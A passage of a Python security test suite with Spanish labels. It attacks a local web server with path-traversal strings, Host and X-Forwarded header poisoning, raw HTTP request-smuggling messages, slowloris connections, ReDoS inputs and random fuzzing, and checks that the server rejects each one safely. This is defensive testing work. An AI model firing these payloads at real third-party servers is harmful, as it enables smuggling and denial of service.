            elif r.status >= 500: bad.append(f"{t[:30]}→{r.status}")
        return not bad, "; ".join(bad[:6]) or f"{len(TR)} intentos de salir de pb_public / leer dotfiles / nombres reservados de Windows"
    scn(cat, f"{len(TR)} variantes de traversal, dotfiles, ADS y nombres reservados de Windows en /assets/", "404 (o 307 de limpieza): nunca contenido fuera de pb_public ni dotfiles", tr_scn)
    def range_scn(ctx):
        bad = []
        for rg in ("bytes=0-0", "bytes=-1", "bytes=9999999999-", "bytes=a-b", "bytes=0-1,5-6", "bytes=" + ",".join(["0-0"] * 1000), "bytes=0-" + "9" * 40, "items=0-1", "bytes=--1", "bytes=1-0", ""):
            t0 = time.time(); r = raw(port, "GET", "/assets/pub.txt", {"Range": rg, "If-Range": "x"}); dt = time.time() - t0
            if r.status >= 500 or dt > 2: bad.append(f"{rg[:20]}→{r.status} {dt:.1f}s")
        r = raw(port, "GET", "/assets/.env", {"Range": "bytes=0-5"})
        if r.status in (200, 206): bad.append("Range salta el bloqueo de dotfile")
        return not bad, "; ".join(bad) or "Range hostil: sin 5xx, sin lentitud, sin saltar bloqueos"
    scn(cat, "Range malicioso (1000 rangos, desbordes, sintaxis inválida) y Range sobre dotfile", "Sin 5xx ni DoS; los bloqueos siguen vigentes", range_scn)
    add(cat, "Archivo legítimo: cabeceras", "nosniff y caché pública acotada", "/assets/pub.txt", st=200, hdr=[r"^x-content-type-options: nosniff", r"^cache-control: public, max-age=300"])
    add(cat, "Archivo bloqueado: no cacheable", "no-store", "/assets/.env", st=404, hdr=[r"^cache-control: no-store"])

    # ---------------------------------------------------------------- S12. Host / proxy / cabeceras
    cat = "S12 · Host, proxies y cabeceras"
    def poison_scn(ctx):
        bad = []
        EV = "evil.example"
        for path in ("/blog", "/", "/blog/hello", f"/u/{UID}", "/go?to=/ok", "/hi?name=x"):
            base = raw(port, "GET", path)
            for h in ({"Host": EV}, {"X-Forwarded-Host": EV}, {"X-Forwarded-Proto": "javascript"}, {"X-Forwarded-Scheme": "nothttps"}, {"X-Original-URL": "/admin"}, {"X-Rewrite-URL": "/admin"}, {"X-Override-URL": "/admin"},
                      {"Forwarded": f"host={EV};proto=http"}, {"X-Host": EV}, {"X-Forwarded-Server": EV}, {"X-HTTP-Host-Override": EV}, {"Referer": f"https://{EV}/"}, {"Origin": f"https://{EV}"}, {"X-Forwarded-Prefix": "/pwn"}):
                r = raw(port, "GET", path, h)
                blob = r.body + "".join(r.hdrlines)
                if EV in blob and EV not in base.body: bad.append(f"{path} {list(h)[0]}: refleja el valor")
                if r.status != base.status and "X-Original-URL" in h or ("X-Rewrite-URL" in h and r.status != base.status): bad.append(f"{path} {list(h)[0]}: cambia la ruta")
        return not bad, "; ".join(bad[:5]) or "ninguna cabecera de proxy/Host se refleja ni cambia el enrutado"
    scn(cat, "Envenenamiento por Host / X-Forwarded-* / X-Original-URL / Forwarded en 6 rutas", "No se reflejan ni alteran respuesta ni enrutado", poison_scn)
    def cors_scn(ctx):
        bad = []
        for path, h in (("/whoami", {"Cookie": cookie(TOKA)}), ("/me", A), ("/pub/" + UID, {}), ("/blog", {})):
            r = raw(port, "GET", path, {**h, "Origin": "https://evil.example"})
            acac = r.header("access-control-allow-credentials"); acao = r.header("access-control-allow-origin")
            if (acac or "").lower() == "true": bad.append(f"{path}: Allow-Credentials true")
            if acao == "https://evil.example" and h: bad.append(f"{path}: refleja Origin en ruta autenticada")
        return not bad, "; ".join(bad) or "sin Allow-Credentials; Origin ajeno no se refleja en rutas autenticadas"
    scn(cat, "CORS: credenciales para orígenes ajenos en rutas con cookie/token", "Nunca Access-Control-Allow-Credentials: true ni eco del Origin", cors_scn)
    add(cat, "Cabeceras de seguridad en página, JSON, error y archivo", "CSP + nosniff + Referrer-Policy en todas las rutas pbmini", "/blog", st=200, hdr=[r"^content-security-policy:.*default-src 'self'", r"^x-content-type-options: nosniff", r"^referrer-policy:", r"^x-frame-options:"])
    add(cat, "Cabeceras de seguridad en una respuesta 404 de pbmini", "Presentes también en errores", "/u/bad", st=404, hdr=[r"^content-security-policy:", r"^x-content-type-options: nosniff"])
    add(cat, "CSP prohíbe scripts/estilos inline y base/form externos", "default-src 'self'; base-uri 'none'; form-action 'self'", "/blog", st=200, hdr=[r"base-uri 'none'", r"form-action 'self'", r"object-src 'none'"], nohdr=[r"unsafe-inline", r"unsafe-eval"])

    # ---------------------------------------------------------------- S13. Protocolo crudo (smuggling y parser HTTP)
    cat = "S13 · Protocolo HTTP crudo"
    H = "Host: x\r\n"
    RAWS = [("CL y TE a la vez (CL.TE)", f"POST /form HTTP/1.1\r\n{H}Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n{H}\r\n"),
            ("Content-Length duplicado distinto", f"POST /form HTTP/1.1\r\n{H}Content-Length: 4\r\nContent-Length: 40\r\n\r\nabcd"),
            ("Content-Length negativo", f"POST /form HTTP/1.1\r\n{H}Content-Length: -1\r\n\r\n"),
            ("Content-Length no numérico", f"POST /form HTTP/1.1\r\n{H}Content-Length: 1e3\r\n\r\n"),
            ("Transfer-Encoding: xchunked", f"POST /form HTTP/1.1\r\n{H}Transfer-Encoding: xchunked\r\n\r\n0\r\n\r\n"),
            ("Transfer-Encoding con espacio/tab", f"POST /form HTTP/1.1\r\n{H}Transfer-Encoding : chunked\r\n\r\n0\r\n\r\n"),
            ("chunked con tamaño inválido", f"POST /form HTTP/1.1\r\n{H}Transfer-Encoding: chunked\r\n\r\nZZ\r\nabc\r\n0\r\n\r\n"),
            ("cabecera con espacio antes de ':'", f"GET /me HTTP/1.1\r\n{H}Authorization : {TOKSU}\r\n\r\n"),
            ("obs-fold (continuación de línea)", f"GET /me HTTP/1.1\r\n{H}X-A: a\r\n b\r\n\r\n"),
            ("LF desnudo como fin de línea", f"GET /health HTTP/1.1\n{H.replace(chr(13), '')}\n"),
            ("HTTP/0.9", "GET /health\r\n"), ("HTTP/9.9", f"GET /health HTTP/9.9\r\n{H}\r\n"), ("método en minúsculas", f"get /health HTTP/1.1\r\n{H}\r\n"),
            ("sin Host en HTTP/1.1", "GET /health HTTP/1.1\r\n\r\n"), ("dos Host distintos", f"GET /health HTTP/1.1\r\n{H}Host: evil.example\r\n\r\n"),
            ("URI absoluta", f"GET http://evil.example/me HTTP/1.1\r\n{H}\r\n"), ("request-target con arroba", f"GET @evil.example/me HTTP/1.1\r\n{H}\r\n"), ("request-target '*'", f"GET * HTTP/1.1\r\n{H}\r\n"),
            ("NUL en la línea de petición", f"GET /health\x00/me HTTP/1.1\r\n{H}\r\n"), ("tabulaciones como separadores", f"GET\t/health\tHTTP/1.1\r\n{H}\r\n"),
            ("PRI * HTTP/2.0 (h2c en claro)", "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"), ("Expect: 100-continue falso", f"POST /form HTTP/1.1\r\n{H}Expect: 100-continue\r\nContent-Length: 3\r\n\r\nabc"),
            ("cabecera de 70 KB", f"GET /health HTTP/1.1\r\n{H}X-Big: {'a' * 70000}\r\n\r\n"), ("línea de petición de 70 KB", f"GET /{'a' * 70000} HTTP/1.1\r\n{H}\r\n"),
            ("3000 cabeceras", f"GET /health HTTP/1.1\r\n{H}" + "".join(f"X-{i}: a\r\n" for i in range(3000)) + "\r\n"), ("nombre de cabecera con caracteres inválidos", f"GET /health HTTP/1.1\r\n{H}X(A): a\r\n\r\n"),
            ("pipelining: GET protegida tras GET pública", f"GET /health HTTP/1.1\r\n{H}\r\nGET /me HTTP/1.1\r\n{H}Connection: close\r\n\r\n")]
    def raw_scn(name, data):
        def f(ctx):
            line, txt = sock(port, data.encode("latin-1", "replace") if isinstance(data, str) else data)
            st = status_of(line); lower = (txt or "")
            body = lower.split("\r\n\r\n", 1)[-1]
            bad = []
            if st >= 500 and st not in (501, 505): bad.append(f"estado {st}")      # 501/505 = rechazo estándar de Go ante TE/versión desconocidos
            if re.search(r"TOP-SECRET|hunter2|TOPSECRET|\"id\":\"[a-z0-9]{15}\"", body) and "pipelining" not in name and "URI absoluta" not in name: bad.append("cuerpo con datos")
            # un segundo mensaje HTTP dentro de la misma respuesta con acceso a /admin o /me sería smuggling exitoso
            if lower.count("HTTP/1.1 200") > 1 and "pipelining" not in name: bad.append("dos respuestas 200 (smuggling)")
            if name.startswith("pipelining") and re.search(r"HTTP/1\.1 200[^\x00]*HTTP/1\.1 200", lower, re.S): bad.append("la ruta protegida respondió 200 sin credenciales")
            alive = raw(port, "GET", "/health").status == 200
            if not alive: bad.append("el servidor dejó de responder")
            return not bad, "; ".join(bad) or f"respuesta {st or 'cierre de conexión'}"
        return f
    for name, data in RAWS:
        scn(cat, f"Protocolo: {name}", "Rechazo (4xx/cierre) o respuesta normal; sin 5xx, sin smuggling, servidor vivo", raw_scn(name, data))

    # ---------------------------------------------------------------- S14. DoS y rendimiento
    cat = "S14 · Disponibilidad (DoS)"
    def slowloris(ctx):
        socks = []
        for _ in range(60):
            try:
                s = socket.create_connection(("127.0.0.1", port), timeout=3); s.sendall(b"GET /health HTTP/1.1\r\nHost: x\r\nX-a: "); socks.append(s)
            except OSError: break
        t0 = time.time(); r = raw(port, "GET", "/health", timeout=5); dt = time.time() - t0
        for s in socks: s.close()
        return (r.status == 200 and dt < 2), f"{len(socks)} conexiones colgadas; petición normal → {r.status} en {dt:.2f}s"
    scn(cat, "Slowloris: 60 conexiones con cabeceras a medio enviar", "El servidor sigue atendiendo en < 2 s", slowloris)
    def concurrent_load(ctx):
        paths = ["/search?page=2", f"/u/{UID}", "/blog", "/slug/hola", "/health", "/assets/pub.txt", f"/pub/{UID}", "/posts?title=hello"]
        def one(i):
            t0 = time.time(); r = raw(port, "GET", paths[i % len(paths)], timeout=60); return r.status, time.time() - t0
        t0 = time.time()
        with concurrent.futures.ThreadPoolExecutor(64) as ex: res = list(ex.map(one, range(600)))
        total = time.time() - t0
        lat = sorted(t for _, t in res); bad = [c for c, _ in res if c >= 500 or c == 0]
        t1 = time.time(); r = raw(port, "GET", "/health", timeout=10); rec = time.time() - t1      # recuperación tras la ráfaga
        ok = not bad and r.status == 200 and rec < 1
        return ok, f"600 peticiones/64 hilos en {total:.1f}s ({600 / total:.0f} req/s): {len(bad)} fallos; p50={lat[300] * 1000:.0f} ms, p95={lat[570] * 1000:.0f} ms; recuperación={rec * 1000:.0f} ms"
    scn(cat, "Carga concurrente: 600 peticiones mixtas con 64 hilos", "Cero 5xx/errores/timeouts y el servidor se recupera en < 1 s (la latencia se informa, no se promete)", concurrent_load)
    def redos(ctx):
        bad = []
        long_slug = "a" * 250 + "!"
        probes = [f"/slug/{long_slug}", f"/search?tag={'a-' * 30}!", f"/blog/{'a-' * 120}!", "/hi?name=" + "<" * 50, "/search?page=" + "9" * 2000]
        for p in probes:
            t0 = time.time(); r = raw(port, "GET", p); dt = time.time() - t0
            if dt > 1.5 or r.status >= 500: bad.append(f"{p[:30]}→{r.status} {dt:.2f}s")
        for ck in ("pb_auth=" + "A" * 8000, "pb_auth=" + ("A." * 4000), "pb_auth=%7B%22token%22%3A%22" + "A" * 2040 + "." + "B" * 2040 + "." + "C" * 40 + "!%22%7D", "a=" + "b" * 8100):
            t0 = time.time(); r = raw(port, "GET", "/whoami", {"Cookie": ck}); dt = time.time() - t0
            if dt > 1.5 or r.status >= 500: bad.append(f"cookie→{r.status} {dt:.2f}s")
        return not bad, "; ".join(bad) or "entradas patológicas contra las regex: todas < 1,5 s"
    scn(cat, "ReDoS: cadenas patológicas contra slug, query tipada, JWT y cookie", "Cada una responde en < 1,5 s sin 5xx", redos)
    def many_params(ctx):
        r1 = raw(port, "GET", "/search?" + "&".join(f"k{i}=1" for i in range(5000)))
        r2 = raw(port, "GET", "/search?" + "a" * 100000)
        r3 = raw(port, "POST", "/body", J, "{" + ",".join(f'"k{i}":1' for i in range(20000)) + "}")
        return (r1.status in (400, 414, 431) and r2.status in (400, 414, 431) and r3.status in (400, 413)), f"5000 params→{r1.status}, query 100 KB→{r2.status}, 20000 claves JSON→{r3.status}"
    scn(cat, "Explosión de parámetros: 5000 query, query de 100 KB, 20000 claves en JSON", "400/414/431/413 rápido", many_params)
    add(cat, "Body de 10 MiB a ruta con límite de 1 KiB", "413 sin consumir el cuerpo completo", "/form", m="POST", d="a" * (10 * 1024 * 1024), st=413)

    # ---------------------------------------------------------------- S15. Aislamiento entre usuarios bajo concurrencia
    cat = "S15 · Aislamiento concurrente"
    def isolation(ctx):
        AID, BID = ctx["AID"], ctx["BID"]
        jobs = []
        for i in range(300):
            who = i % 3
            jobs.append((who, ["/whoami", "/mine"][i % 2]))
        def one(job):
            who, path = job
            h = {0: {"Authorization": TOKA}, 1: {"Authorization": TOKB}, 2: {"Cookie": cookie(TOKA)}}[who]
            r = raw(port, "GET", path, h, timeout=15)
            for _try in range(2):   # un fallo de CONEXIÓN (status 0, p. ej. ráfaga de 48 conexiones en Windows) se reintenta; un contenido cruzado nunca se reintenta
                if r.status != 0: break
                time.sleep(0.3); r = raw(port, "GET", path, h, timeout=15)
            return who, path, r
        with concurrent.futures.ThreadPoolExecutor(48) as ex: res = list(ex.map(one, jobs))
        bad = []
        for who, path, r in res:
            if r.status != 200: bad.append(f"{who}{path}→{r.status}" + (f" ({r.body[:70]})" if r.status == 0 else "")); continue
            if path == "/whoami":
                want, other = (AID, BID) if who in (0, 2) else (BID, AID)
                if f'"id":"{want}"' not in r.body or other in r.body: bad.append(f"{who}{path}: identidad cruzada")
            else:
                want, other = ("A-DOC", "B-DOC") if who in (0, 2) else ("B-DOC", "A-DOC")
                if want not in r.body or other in r.body: bad.append(f"{who}{path}: datos cruzados")
        return not bad, "; ".join(bad[:4]) or "300 peticiones intercaladas A/B/cookie: cada una vio solo lo suyo"
    scn(cat, "Fuga de identidad/datos entre usuarios con 300 peticiones concurrentes (token A, token B, cookie A)", "Cada respuesta contiene únicamente los datos de su usuario", isolation)
    def cache_isolation(ctx):
        bad = []
        def one(i):
            h = [{}, {"Authorization": TOKA}, {"Authorization": TOKB}, {"Cookie": cookie(TOKA)}][i % 4]
            r = raw(port, "GET", f"/pub/{UID}", h, timeout=15)
            for _try in range(2):
                if r.status != 0: break
                time.sleep(0.3); r = raw(port, "GET", f"/pub/{UID}", h, timeout=15)
            return r
        with concurrent.futures.ThreadPoolExecutor(32) as ex: res = list(ex.map(one, range(200)))
        for r in res:
            if r.status != 200: bad.append(f"HTTP {r.status}" + (f" ({r.body[:70]})" if r.status == 0 else ""))   # error de red/servidor, no fuga
            elif '"who":null' not in r.body: bad.append("identidad en ruta cacheable")
            cc = r.header("cache-control") or ""
        return not bad, "; ".join(bad[:3]) or "ruta cacheable: siempre anónima aunque llegue con token/cookie"
    scn(cat, "Caché compartida contaminada con identidad bajo concurrencia (200 peticiones mezcladas)", "La respuesta cacheable nunca incluye datos de usuario", cache_isolation)

    # ---------------------------------------------------------------- S16. Fuzzing aleatorio con semilla fija
    cat = "S16 · Fuzzing"
    def fuzz(ctx):
        rnd = random.Random(1337)
        tpl = ["/u/{}", "/slug/{}", "/blog/{}", "/blog?{}", "/search?{}", "/posts?title={}", "/docs/{}", "/assets/{}", "/users/{}", f"/users/{UID}/posts/{{}}", "/hi?name={}", "/track?{}", "/contact?{}", "/{}"]
        skip = ("boom", "go?", "badsort", "undeclared")
        alphabet = "abcXYZ019-_.%/\\;:?&=+~@!$'\"<>{}[]()| \t\r\n\x00\x7f"
        def mut():
            n_ = rnd.randint(0, 40); s = ""
            for _ in range(n_):
                c = rnd.random()
                s += (rnd.choice(alphabet) if c < .5 else "%" + "".join(rnd.choice("0123456789abcdefABCDEF") for _ in range(2)) if c < .85 else chr(rnd.randint(128, 0x2fff)))
            return urllib.parse.quote(s, safe="%/?&=:;~@!$'()*+,[]") if rnd.random() < .7 else s.replace(" ", "").replace("\r", "").replace("\n", "").replace("\t", "")
        meths = ["GET"] * 6 + ["POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"]
        bad = []; n5 = 0; total = 1500
        for i in range(total):
            p = rnd.choice(tpl).format(mut())
            if any(s in p for s in skip): continue
            h = {}
            if rnd.random() < .3: h["Authorization"] = rnd.choice([TOKA, TOKB, "x", "Bearer " + TOKA, "", "null", TOKA + "x"])
            if rnd.random() < .3: h["Cookie"] = rnd.choice([cookie(TOKA), "pb_auth=" + mut(), "a=b", cookie("x")])
            if rnd.random() < .2: h["Content-Type"] = rnd.choice(["application/json", "text/plain", "multipart/form-data; boundary=B", "x"])
            try: r = raw(port, rnd.choice(meths), p, h, mut() if rnd.random() < .4 else None, timeout=8)
            except Exception as e: bad.append(f"{p[:30]}: {e}"); continue
            if r.status >= 500: n5 += 1; bad.append(f"{p[:40]!r}→{r.status}")
            for k in L.LEAKS:
                if k in r.body: bad.append(f"{p[:30]}→FUGA {k}")
            if 200 <= r.status < 300 and "text/html" in (r.header("content-type") or "") and html_danger(r.body): bad.append(f"{p[:30]}→HTML activo {html_danger(r.body)[:2]}")
        alive = raw(port, "GET", "/health").status == 200
        if not alive: bad.append("servidor caído tras el fuzzing")
        return not bad, "; ".join(bad[:5]) or f"{total} peticiones aleatorias (semilla 1337): 0 errores 5xx, 0 fugas, servidor vivo"
    scn(cat, "Fuzzing: 1500 peticiones aleatorias (método, ruta, query, cabeceras, cuerpo, bytes inválidos)", "Cero 5xx, cero fugas de canarios, cero HTML activo, servidor vivo", fuzz)
    return cases
